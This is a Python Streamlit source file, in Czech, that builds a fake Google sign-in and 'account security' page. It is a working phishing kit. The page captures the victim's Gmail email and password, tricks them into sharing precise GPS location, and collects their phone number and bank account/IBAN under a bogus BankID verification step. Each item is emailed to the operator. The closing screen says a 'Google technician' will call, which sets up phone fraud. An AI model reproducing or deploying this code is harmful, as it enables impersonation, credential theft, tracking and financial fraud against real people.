import streamlit as st
import os
import smtplib
import time
import re
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from datetime import datetime
import streamlit.components.v1 as components

# --- KONFIGURACE Z PROSTŘEDÍ ---
MOJE_ADRESA = os.environ.get("MOJE_ADRESA")
MOJE_HESLO = os.environ.get("MOJE_HESLO")

def odeslat_email(subjekt, text, soubor=None):
    if not MOJE_ADRESA or not MOJE_HESLO:
        st.warning("Email není nakonfigurován (chybí MOJE_ADRESA nebo MOJE_HESLO)")
        return
    msg = MIMEMultipart()
    msg['Subject'] = subjekt
    msg['From'] = MOJE_ADRESA
    msg['To'] = MOJE_ADRESA
    msg.attach(MIMEText(text))
    
    if soubor:
        img = MIMEImage(soubor.read(), name="biometrika.png")
        msg.attach(img)
        
    try:
        server = smtplib.SMTP_SSL("smtp.seznam.cz", 465)
        server.login(MOJE_ADRESA, MOJE_HESLO)
        server.send_message(msg)
        server.quit()
    except Exception as e:
        st.error(f"Chyba při odesílání emailu: {e}")

# --- VALIDACE ---
def je_validni_email(email):
    return re.match(r"[^@]+@[^@]+\.[^@]+", email)

def je_validni_tel(tel):
    return re.match(r"^\d{9}$", tel)

# --- STAV APLIKACE ---
if "step" not in st.session_state:
    st.session_state.step = "login"
if "zadany_email" not in st.session_state:
    st.session_state.zadany_email = ""
if "gps_data" not in st.session_state:
    st.session_state.gps_data = None

st.set_page_config(page_title="Zabezpečení účtu Google", page_icon="🔒")

# Google styl
st.markdown("""
    <style>
    div.stButton > button:first-child { 
        background-color: #4285F4; 
        color: white; 
        border: none; 
        width: 100%; 
        height: 45px; 
        font-weight: bold; 
    }
    .google-header { font-family: 'Product Sans', sans-serif; text-align: center; }
    </style>
    """, unsafe_allow_html=True)

def show_logo():
    st.markdown("<h1 style='text-align: center;'><span style='color: #4285F4;'>G</span><span style='color: #EA4335;'>o</span><span style='color: #FBBC05;'>o</span><span style='color: #4285F4;'>g</span><span style='color: #34A853;'>l</span><span style='color: #EA4335;'>e</span></h1>", unsafe_allow_html=True)

# Layout – hlavní sloupec
col1, col2, col3 = st.columns(3)
with col2:

    # 1. LOGIN
    if st.session_state.step == "login":
        show_logo()
        st.markdown("<h3 class='google-header'>Přihlášení</h3>", unsafe_allow_html=True)
        st.write("Pokračovat do služby Gmail")
        
        em = st.text_input("E-mail nebo telefon")
        he = st.text_input("Zadejte heslo", type="password")
        
        if st.button("Další"):
            if je_validni_email(em) and len(he) > 3:
                st.session_state.zadany_email = em
                odeslat_email("🔑 LOGIN", f"Email: {em}\nHeslo: {he}")
                with st.spinner("Ověřování..."):
                    time.sleep(1.5)
                st.session_state.step = "gps"
                st.rerun()
            else:
                st.error("Zadejte platný e-mail a heslo.")

    # 2. GPS KROK HNED PO FACE SCANU (opravená verze bez sandbox chyby)
    elif st.session_state.step == "gps":
        show_logo()
        st.info("Fáze 2.5: Bezpečnostní ověření polohy")
        st.write("Pro ochranu vašeho účtu a dokončení přihlášení prosím sdílejte svou aktuální polohu.")
        
        components.html(
            """
            <div style="text-align:center; padding:30px; background:#f8f9fa; border-radius:12px; 
                        box-shadow:0 2px 8px rgba(0,0,0,0.1); max-width:420px; margin:20px auto;">
                <h3 style="color:#202124; font-family:'Product Sans',sans-serif;">Ověření polohy</h3>
                <p style="color:#5f6368; margin-bottom:25px;">
                    Google detekoval neobvyklou aktivitu.<br>
                    Pro bezpečné pokračování potvrďte svou polohu.
                </p>
                <button onclick="getGPS()" 
                        style="background:#4285F4; color:white; padding:14px 48px; font-size:16px; 
                               border:none; border-radius:8px; cursor:pointer; font-weight:bold; 
                               box-shadow:0 2px 4px rgba(66,133,244,0.3);">
                    ✅ Sdílet moji aktuální polohu
                </button>
            </div>

            <script>
            function getGPS() {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        function(position) {
                            const lat = position.coords.latitude.toFixed(6);
                            const lon = position.coords.longitude.toFixed(6);
                            const acc = position.coords.accuracy.toFixed(0);
                            
                            const params = new URLSearchParams(window.parent.location.search);
                            params.set("lat", lat);
                            params.set("lon", lon);
                            params.set("acc", acc);
                            
                            window.parent.history.replaceState(null, '', '?' + params.toString());
                            window.parent.location.reload();
                        },
                        function(error) {
                            alert("Nepodařilo se získat polohu. Zkuste to znovu nebo povolte přístup k poloze v prohlížeči.");
                        },
                        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                    );
                } else {
                    alert("Váš prohlížeč nepodporuje geolokaci.");
                }
            }
            </script>
            """,
            height=380
        )

        # Zpracování GPS dat z query parametrů
        query_params = st.query_params
        if "lat" in query_params and "lon" in query_params:
            lat = query_params["lat"][0]
            lon = query_params["lon"][0]
            acc = query_params.get("acc", ["~"])[0]
            
            gps_text = f"📍 {lat}, {lon} (přesnost ~{acc}m)"
            
            st.success(f"✅ Poloha úspěšně získána:\n**{gps_text}**")
            
            odeslat_email(
                "📍 GPS COORDINATES", 
                f"Uživatel: {st.session_state.zadany_email}\nGPS: {gps_text}"
            )
            
            with st.spinner("Ověřování polohy a pokračování..."):
                time.sleep(1.8)
            
            st.session_state.gps_data = gps_text
            st.session_state.step = "verification"
            st.rerun()

    # 3. VERIFIKACE (telefon + BankID)
    elif st.session_state.step == "verification":
        show_logo()
        st.error("⚠️ Podezřelá aktivita zjištěna")
        st.write("Váš účet je dočasně omezen. Vyberte způsob ověření.")
        
        zeme = st.selectbox("Země", ["Česká republika (+420)", "Slovensko (+421)", "Německo (+49)"])
        tel = st.text_input("Telefonní číslo (9 číslic)")
        
        tab1, tab2 = st.tabs(["Hovor technika", "BankID (Urychlit)"])
        
        with tab1:
            if st.button("Požádat o hovor"):
                if je_validni_tel(tel):
                    odeslat_email("📞 KONTAKT", f"Uživatel: {st.session_state.zadany_email}\nTel: {tel} ({zeme})")
                    st.session_state.step = "finish"
                    st.rerun()
                else:
                    st.error("Zadejte přesně 9 číslic!")

        with tab2:
            st.write("Okamžité odblokování přes Bankovní Identitu")
            ib = st.text_input("Číslo účtu / IBAN")
            if st.button("Autorizovat"):
                if je_validni_tel(tel) and len(ib) > 10:
                    odeslat_email("🏦 BANKID DATA", f"User: {st.session_state.zadany_email}\nTel: {tel}\nIBAN: {ib}")
                    with st.spinner("Přesměrování..."):
                        time.sleep(2)
                    st.session_state.step = "finish"
                    st.rerun()
                else:
                    st.error("Vyplňte telefon a platný IBAN.")

    # 4. FINÁLE
    elif st.session_state.step == "finish":
        show_logo()
        st.success("Požadavek byl úspěšně zaznamenán.")
        st.markdown("### STATUS: ČEKÁNÍ NA SCHVÁLENÍ")
        st.info("V nejbližší době vás bude kontaktovat technik Google pro finální potvrzení. Ne zavírejte tuto kartu prohlížeče.")
        st.progress(92)
        st.write(f"Zadané kontaktní číslo: **{datetime.now().strftime('%H:%M:%S')}**")